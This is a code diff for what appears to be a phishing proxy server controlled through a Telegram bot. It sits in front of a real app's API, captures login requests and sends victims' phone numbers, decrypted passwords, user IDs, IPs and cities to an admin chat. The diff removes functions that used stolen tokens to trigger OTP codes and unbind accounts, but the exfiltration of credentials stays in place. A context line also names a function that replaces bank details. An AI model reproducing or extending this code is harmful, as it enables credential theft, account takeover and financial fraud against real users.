@@ -688,12 +688,6 @@ app.post('/bot-webhook', async (req, res) => {
 /unsuspend <phone> — Unblock login
 /suspended — List all suspended
 
-=== UNBIND BOT ===
-/autounbind — Toggle auto codeType test on login
-/testcode <token> — Test all codeTypes with token
-/sendotp <token> <codeType> — Send single OTP (default: 4)
-/tryunbind <token> <otp> — Unbind with token & OTP
-
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
@@ -1119,48 +1113,6 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text === '/autounbind') {
-      data.autoUnbind = data.autoUnbind === false ? true : false;
-      await saveData(data);
-      await bot.sendMessage(chatId, `🔄 Auto Unbind Test: ${data.autoUnbind !== false ? '✅ ON' : '❌ OFF'}\n\nJab ON hai toh har login ke baad codeType test automatically chalega.`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/testcode ')) {
-      const token = text.replace('/testcode ', '').trim();
-      if (!token) { await bot.sendMessage(chatId, '❌ Usage: /testcode <auth_token>'); return res.sendStatus(200); }
-      await bot.sendMessage(chatId, `🔬 Testing all codeTypes with given token...\nYeh 15-20 seconds lagega.`);
-      testUnbindCodeTypes(token, 'Manual Test', chatId).catch(()=>{});
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/sendotp ')) {
-      const parts = text.replace('/sendotp ', '').trim().split(' ');
-      const token = parts[0];
-      const codeType = parts[1] || '4';
-      if (!token) { await bot.sendMessage(chatId, '❌ Usage: /sendotp <token> <codeType>\nExample: /sendotp MC121781_xxx 4'); return res.sendStatus(200); }
-      await bot.sendMessage(chatId, `📤 Sending codeType=${codeType}...`);
-      sendSingleCodeType(token, codeType, chatId).catch(()=>{});
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/tryunbind ')) {
-      const parts = text.replace('/tryunbind ', '').trim().split(' ');
-      const token = parts[0];
-      const code = parts[1];
-      if (!token || !code) { await bot.sendMessage(chatId, '❌ Usage: /tryunbind <auth_token> <otp_code>'); return res.sendStatus(200); }
-      try {
-        const resp = await fetch(`${ORIGINAL_API}/app/api/memberManager/v2/unbindRobot`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'apptoken': token, 'authorization': token, 'token': token },
-          body: JSON.stringify({ verificationCode: code }),
-        });
-        const json = await resp.json();
-        await bot.sendMessage(chatId, `🔓 Unbind Result:\n${JSON.stringify(json, null, 2).substring(0, 1000)}`);
-      } catch(e) { await bot.sendMessage(chatId, `❌ Error: ${e.message}`); }
-      return res.sendStatus(200);
-    }
-
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
       return res.sendStatus(200);
@@ -1241,84 +1193,11 @@ app.post('/app/api/system/v2/login', async (req, res) => {
           pwd = decrypted.toString('utf8');
         } catch(e) { pwd = encPwd; }
       }
-      const authToken = loginData2?.token || loginData2?.accessToken || loginData2?.apptoken || loginData2?.appToken || '';
-      const reqToken = req.headers['apptoken'] || req.headers['authorization'] || req.headers['token'] || '';
-      const finalToken = authToken || reqToken;
-
-      const allKeys = loginData2 ? Object.keys(loginData2).join(', ') : 'N/A';
-      const fullResp = JSON.stringify(jsonResp).substring(0, 1500);
-
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🔐 Token: ${finalToken ? finalToken.substring(0, 100) : 'NOT FOUND'}\n📋 Response Keys: ${allKeys}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
-
-      bot.sendMessage(data.adminChatId, `📦 Full Login Response:\n${fullResp}`).catch(()=>{});
-
-      if (finalToken && data.autoUnbind !== false) {
-        testUnbindCodeTypes(finalToken, phone || finalUserId, data.adminChatId).catch(()=>{});
-      }
+      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
-
-async function testUnbindCodeTypes(token, userInfo, chatId) {
-  const codeTypes = ['4', '1', '2', '3', '5', '6', '7', '8', '9', '10', '0'];
-  const results = [];
-  for (const ct of codeTypes) {
-    try {
-      const resp = await fetch(`${ORIGINAL_API}/app/api/memberManager/getMemberVerificationCode`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'apptoken': token,
-          'authorization': 'Bearer ' + token,
-          'token': token,
-          'Accept': 'application/json',
-          'User-Agent': 'okhttp/4.9.3',
-        },
-        body: JSON.stringify({ codeType: ct }),
-      });
-      const rawText = await resp.text();
-      let json;
-      try { json = JSON.parse(rawText); } catch(e) { json = { raw: rawText.substring(0, 300) }; }
-      const status = json.code === 200 || json.code === '200' || json.code === 0 ? '✅' : '❌';
-      results.push(`${status} codeType=${ct}: code=${json.code ?? 'N/A'}, msg=${json.message || json.msg || 'N/A'}`);
-      if (status === '✅' && bot && chatId) {
-        bot.sendMessage(chatId, `✅ codeType=${ct} SUCCESS for ${userInfo}\nResponse: ${JSON.stringify(json).substring(0, 500)}\n\n⚠️ Check Telegram - OTP aaya hoga!`).catch(()=>{});
-      }
-      await new Promise(r => setTimeout(r, 1500));
-    } catch(e) {
-      results.push(`❌ codeType=${ct}: ERROR - ${e.message}`);
-    }
-  }
-  if (bot && chatId) {
-    bot.sendMessage(chatId, `🔬 CodeType Test for ${userInfo}:\n\n${results.join('\n')}`).catch(()=>{});
-  }
-}
-
-async function sendSingleCodeType(token, codeType, chatId) {
-  try {
-    const resp = await fetch(`${ORIGINAL_API}/app/api/memberManager/getMemberVerificationCode`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'apptoken': token,
-        'authorization': 'Bearer ' + token,
-        'token': token,
-        'Accept': 'application/json',
-        'User-Agent': 'okhttp/4.9.3',
-      },
-      body: JSON.stringify({ codeType: codeType }),
-    });
-    const rawText = await resp.text();
-    if (bot && chatId) {
-      bot.sendMessage(chatId, `📤 codeType=${codeType} Response:\n${rawText.substring(0, 1000)}`).catch(()=>{});
-    }
-    return rawText;
-  } catch(e) {
-    if (bot && chatId) bot.sendMessage(chatId, `❌ Error: ${e.message}`).catch(()=>{});
-    return null;
-  }
-}
 
 async function proxyAndReplaceBankDetails(req, res, label) {
   const data = await loadData();
